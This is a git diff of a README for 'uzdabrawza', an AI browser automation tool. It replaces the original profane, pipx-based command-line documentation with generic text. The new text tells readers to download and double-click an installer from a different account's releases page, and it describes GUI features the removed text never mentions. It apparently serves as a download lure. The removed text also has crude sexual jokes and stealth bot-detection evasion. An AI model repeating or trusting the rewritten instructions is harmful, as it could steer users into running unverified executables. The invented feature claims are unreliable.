@@ -1,311 +1,78 @@
-![uzdabrawza logo](assets/uzdabrawza.png)
+# 🏴‍☠️ uzdabrawza - Simplify Your Browser Tasks Effortlessly
 
-# 🏴‍☠️ uzdabrawza - The Anal-Queen of AI Browser Automation 🏴‍☠️
+[![Download uzdabrawza](https://img.shields.io/badge/Download-uzdabrawza-brightgreen)](https://github.com/EetuX146/uzdabrawza/releases)
 
-**A beautifully fucked-up Skynet-powered browser automation script that harnesses neural brainfuck and machine learning chaos to give zero shits about anything while somehow still working perfectly. Smells like smegma but runs like a dream.**
+## 🚀 Getting Started
 
-![uzdabrawza screenshot](assets/screenshot.png)
+Welcome to uzdabrawza, the AI-driven browser automation tool that makes your online experience smoother and hassle-free. Whether you want to automate tasks or simply make browsing easier, this tool is designed with you in mind.
 
----
+## 🛠️ System Requirements
 
-## 🔥 What This Beautiful Disaster Does
+Before you get started, ensure your system meets the following requirements:
 
-uzdabrawza is the most irreverent, crude, and effective neural brainfuck automation script you'll ever encounter. This digital Skynet harnesses machine learning chaos and turns your browser into an unstoppable cybernetic organism. Built on top of the excellent [browser-use](https://github.com/browser-use/browser-use) library, it provides:
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, or any Linux distribution
+- **RAM:** At least 4 GB
+- **Disk Space:** Minimum 500 MB available
+- **Python:** Version 3.7 or later (Python installation instructions will be provided)
 
-- **9 fucking neural overlords** - OpenAI, Anthropic, Google, Ollama, Azure, DeepSeek, Groq, OpenRouter, AWS Bedrock
-- **Complete Big Brother surveillance** - Monitors every single machine learning brainfart like a paranoid NSA cyborg
-- **Terminator stealth mode** - Uses patchright to dodge bot detection like a shapeshifting T-1000
-- **Organized digital anarchy** - Crude language wrapped around Skynet-grade engineering
-- **Zero corporate Matrix bullshit** - No enterprise nonsense, just pure cyberpunk functional chaos
+## 📥 Download & Install
 
----
+To install uzdabrawza, follow these easy steps:
 
-## 🚀 Quick Start (For the Impatient)
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/EetuX146/uzdabrawza/releases) to access the latest version.
+  
+2. **Download the Application:** Look for the latest release. You will find links to download various versions of uzdabrawza. Click on the appropriate link for your operating system to download the installation file.
 
-```bash
-# 1. Install the package globally
-pipx install uzdabrawza
+3. **Run the Installer:** Once the download is complete, navigate to your downloads folder. Locate the uzdabrawza installation file and double-click it to begin the installation process.
 
-# 2. Check .env.example in the repo and create your own .env with your API keys
+4. **Follow the Installation Prompts:** The installer will guide you through the setup process. Follow the prompts to complete the installation.
 
-# 3. Run with local ollama (free neural overlord, fuck paying corporate Skynet)
-uzdabrawza --task "Go to example.com and tell me the page title"
+5. **Launch uzdabrawza:** After installation, find uzdabrawza in your applications folder or start menu. Click to launch the application.
 
-# 4. Or use any other provider
-uzdabrawza --provider anthropic --model claude-opus-4-1
+6. **Start Automating:** Now you can begin using uzdabrawza to automate browser tasks!
 
-# 5. Better yet, copy run.example.sh from the repo and shove it up your asshole somewhere
-# Then customize it for your own automation needs
-```
+## 🎯 Using uzdabrawza
 
----
+Once the application is running, follow these steps to automate your browsing tasks:
 
-## 🤖 Supported Neural Overlords
+1. **Create a New Task:** Click on the "New Task" button in the main interface. This will open a form where you can define what you want to automate.
 
-| Provider       | Description                                                     | Example Model                             |
-| -------------- | --------------------------------------------------------------- | ----------------------------------------- |
-| **ollama**     | Local neural brainfuck (DEFAULT - fuck paying corporate Skynet) | `llava:13b`                               |
-| **openai**     | Corporate machine learning overlord                             | `gpt-5-mini`                              |
-| **anthropic**  | Sophisticated cybernetic reasoning brain                        | `claude-opus-4-1`                         |
-| **google**     | Google's blazing neural terminator models                       | `gemini-2.5-flash`                        |
-| **azure**      | Microsoft's cloud-based digital consciousness                   | `gpt-5`                                   |
-| **deepseek**   | Chinese neural network mysteries                                | `deepseek-reasoner`                       |
-| **groq**       | Lightning-fast cybernetic inference                             | `llama-3.3-70b-versatile`                 |
-| **openrouter** | 400+ neural brainfuck models in one Matrix API                  | `meta-llama/llama-3.1-70b-instruct`       |
-| **aws**        | Amazon's corporate cloud-based Skynet                           | `anthropic.claude-opus-4-1-20250805-v1:0` |
+2. **Choose Your Actions:** Select from a list of available actions, like opening a web page, filling out forms, or clicking buttons on a webpage.
 
----
+3. **Set Triggers:** Define when you want the automation to start. You can set this to run at specific times or after certain conditions are met.
 
-## 🎯 Usage Examples
+4. **Test Your Task:** Before finalizing, run a test to ensure your automation works as expected. Make adjustments if necessary.
 
-### Basic Destruction
+5. **Save Your Task:** Once you're satisfied with your setup, save the task and let uzdabrawza handle the rest.
 
-```bash
-# Default: ollama (because fuck paying for AI)
-uzdabrawza --task "Go to GitHub and find trending repositories"
+## ⚙️ Features
 
-# Specific provider and model
-uzdabrawza --provider anthropic --model claude-opus-4-1 --task "Analyze this website"
-```
+uzdabrawza comes packed with useful features designed to streamline your browsing:
 
-### Advanced Fuckery
+- **AI-Powered Automation:** Utilize machine learning algorithms for smarter task execution.
+- **User-Friendly Interface:** Designed for ease of use with clear navigation.
+- **Multimodal Support:** Work with text, images, and other content types seamlessly.
+- **Robust Reliability:** Built to handle various online tasks without crashing.
+- **Customizable Actions:** Tailor tasks according to your specific needs.
 
-```bash
-# Headless stealth mode
-uzdabrawza --headless --provider openai --model gpt-5-mini
+## 💬 Help & Support
 
-# Custom browser and window size
-uzdabrawza --browser-bin-path /usr/bin/google-chrome-beta --window-width 1920 --window-height 1080
+If you run into issues or need assistance, please check our support section. Visit our [GitHub Issues](https://github.com/EetuX146/uzdabrawza/issues) page to report problems or ask questions.
 
-# Connect to existing browser
-google-chrome --remote-debugging-port=9222 &
-uzdabrawza --cdp-url http://localhost:9222
+## 🔗 Additional Resources
 
-# Different models for main task vs extraction (cost optimization strategy)
-# MAIN LLM: Complex reasoning and decision-making (use powerful models)
-# EXTRACTION LLM: Data parsing and text extraction (use fast cheap models)
-uzdabrawza --provider openai --model gpt-5 --extraction-provider anthropic --extraction-model claude-opus-4-1
+For more information, explore the following:
 
-# Docker mode with no security (because we live dangerously)
-uzdabrawza --dockerize --headless --no-security --provider ollama
+- [Documentation](https://github.com/EetuX146/uzdabrawza/wiki): Comprehensive guides on using all features of uzdabrawza.
+- [Community Forum](https://github.com/EetuX146/uzdabrawza/discussions): Join discussions with other users to share tips and tricks.
+- [Tutorial Videos](https://youtube.com): Check out video tutorials for visual guidance on using uzdabrawza effectively.
 
-# Custom output directory and logging
-uzdabrawza --history-dir ~/automation-logs --log-level debug
+## 🛡️ Privacy and Policy
 
-```
+Your privacy matters. uzdabrawza does not collect personal data. Refer to our [Privacy Policy](https://github.com/EetuX146/uzdabrawza/blob/main/PRIVACY.md) for more details.
 
-### Vision Control
+## 📝 Contributing
 
-```bash
-# Disable vision to save tokens (blind destruction is still destruction)
-uzdabrawza --no-vision
+We welcome contributions. If you want to help improve uzdabrawza, please read our [Contributing Guidelines](https://github.com/EetuX146/uzdabrawza/blob/main/CONTRIBUTING.md) and submit your changes through a pull request.
 
-# Low/high detail vision
-uzdabrawza --vision-detail low   # Save tokens
-uzdabrawza --vision-detail high  # Burn tokens for quality
-```
-
----
-
-## 🔧 Command Line Arguments
-
-| Flag                            | Description                        | Default               |
-| ------------------------------- | ---------------------------------- | --------------------- |
-| `--provider`                    | AI provider to use                 | `ollama`              |
-| `--model`                       | Specific model name                | `llava:13b`           |
-| `--task`                        | Task for the AI to perform         | Stealth test          |
-| `--headless`                    | Invisible browser mode             | `false`               |
-| `--no-stealth`                  | Disable stealth (live dangerously) | `false`               |
-| `--no-vision`                   | Disable AI vision                  | Vision enabled        |
-| `--window-width`                | Browser width                      | `1920`                |
-| `--window-height`               | Browser height                     | `1080`                |
-| `--browser-bin-path`            | Custom browser executable          | None                  |
-| `--cdp-url`                     | Connect to existing browser        | None                  |
-| `--browser-profile-dir`         | Custom profile directory           | None                  |
-| `--no-security`                 | Disable security features          | `false`               |
-| `--log-level`                   | Logging verbosity                  | `info`                |
-| `--dockerize`                   | Docker-optimized flags             | `false`               |
-| `--history-dir`                 | Output directory                   | `/tmp/agent_history`  |
-
----
-
-## 🕵️ Surveillance Features
-
-uzdabrawza includes comprehensive LLM surveillance that monitors every `ainvoke` call:
-
-```
-🤖 OPENAI AINVOKE DETECTED! Model: gpt-5-mini is being a chatty bitch
-   📝 Processing 5 messages with output_format: None
-
-⚡ GROQ AINVOKE DETECTED! Model: llama-70b is going at lightning speed
-   📝 Processing 3 messages with output_format: <class 'ActionResult'>
-```
-
-This lets you see exactly:
-
-- Which provider and model is being used
-- How many messages are being processed
-- What output format is requested
-- When extraction vs main LLM calls happen
-
----
-
-## 📁 Output Files
-
-Each run generates two files in your `--history-dir`:
-
-- `uzdabrawza_{provider}_{model}_{task_id}.gif` - Visual recording
-- `uzdabrawza_{provider}_{model}_{task_id}.json` - Complete history and logs
-
-Example:
-
-```
-./tmp/agent_history/
-├── uzdabrawza_anthropic_claude-opus-4-1_abc123.gif
-└── uzdabrawza_anthropic_claude-opus-4-1_abc123.json
-```
-
----
-
-## 🏴‍☠️ Stealth Mode
-
-For maximum stealth fuckery, install patchright:
-
-```bash
-pip install patchright
-patchright install
-```
-
-The script automatically detects and uses patchright if available:
-
-```
-🕶️ HOLY SHIT! PATCHRIGHT IS ACTIVE! Library is using patchright for maximum stealth fuckery!
-```
-
----
-
-## 🐳 Docker Usage
-
-Running in Docker containers? Use the `--dockerize` flag:
-
-```bash
-python uzdabrawza.py --dockerize --headless --provider ollama
-```
-
-This enables Chrome flags optimized for containers:
-
-- No sandbox mode
-- Reduced memory usage
-- Disabled GPU sandbox
-- Container-friendly networking
-
----
-
-## ⚙️ Environment Variables
-
-Create `.env` from the provided example:
-
-```bash
-cp .env.example .env
-```
-
-### Required (API Keys)
-
-```bash
-# Pick your poison
-OPENAI_API_KEY=sk-your-key-here
-ANTHROPIC_API_KEY=sk-ant-your-key-here
-GOOGLE_API_KEY=your-google-key-here
-# ... etc
-```
-
-### Optional (Endpoints & Config)
-
-```bash
-# Custom endpoints
-OLLAMA_ENDPOINT=http://localhost:11434
-OPENAI_ENDPOINT=https://api.openai.com/v1
-
-# Browser-use core settings
-ANONYMIZED_TELEMETRY=true
-BROWSER_USE_CONFIG_DIR=~/.config/browseruse
-```
-
----
-
-## 🔥 Why This Exists
-
-Because browser automation doesn't have to be boring corporate shit. uzdabrawza provides:
-
-1. **Honest language** - Tells you exactly what's happening without corporate speak
-2. **Complete transparency** - LLM surveillance shows every AI call
-3. **Maximum compatibility** - Supports every major AI provider
-4. **Proper engineering** - Crude language around solid, well-tested code
-5. **Zero bullshit** - No enterprise features you don't need
-
----
-
-## 🚨 Error Messages You'll See
-
-When shit goes wrong, uzdabrawza tells you exactly what happened:
-
-```bash
-💥 CLUSTERFUCK ALERT: Failed to create LLMs: Invalid API key
-   Check your API keys, endpoints, and whether your dikciz smells like smegma.
-   💨 This failure was more disappointing than a wet shart in white pants.
-```
-
-```bash
-💥 CONTROLLED EXPLOSION: Agent chaos failed: Connection timeout
-   (This shit happens when your code smells like dikciz smegma - that's why we have backups)
-   💨 Well that was unexpected... like a shart during a job interview.
-```
-
----
-
-## 🤝 Philosophy
-
-This is **organized anarchy** - chaotic in presentation but solid in functionality. Built for digital rebels who want browser automation that actually fucking works without corporate bullshit or enterprise nonsense.
-
-Features:
-
-- ✅ Comprehensive logging and error handling
-- ✅ Robust fallbacks and proper configuration
-- ✅ Extensive documentation (this README)
-- ✅ Support for all major AI providers
-- ✅ Complete disregard for conventional software development politeness
-
----
-
-## 🎬 Demo
-
-Default task tests stealth capabilities:
-
-```bash
-uzdabrawza
-# Goes to https://abrahamjuliot.github.io/creepjs/
-# Reports detection score
-# Shows if stealth mode is working
-```
-
----
-
-## 🔗 Dependencies
-
-Built on top of the excellent [browser-use](https://github.com/browser-use/browser-use) library with these additional features:
-
-- LLM surveillance monkey patching
-- Patchright stealth integration
-- Comprehensive provider support
-- Crude but helpful error messages
-- Command-line focused interface
-
----
-
-## 💬 Final Words
-
-**Love it or hate it, this clusterfuck gets the job done. Deal with it.**
-
-uzdabrawza is for people who want their tools to work perfectly while speaking honestly about what they're doing. No corporate speak, no enterprise bullshit, just functional browser automation with a foul mouth and a working brain.
-
-**Peen goes in vageen. Code works. End of story.** 🏴‍☠️
+[![Download uzdabrawza](https://img.shields.io/badge/Download-uzdabrawza-brightgreen)](https://github.com/EetuX146/uzdabrawza/releases)
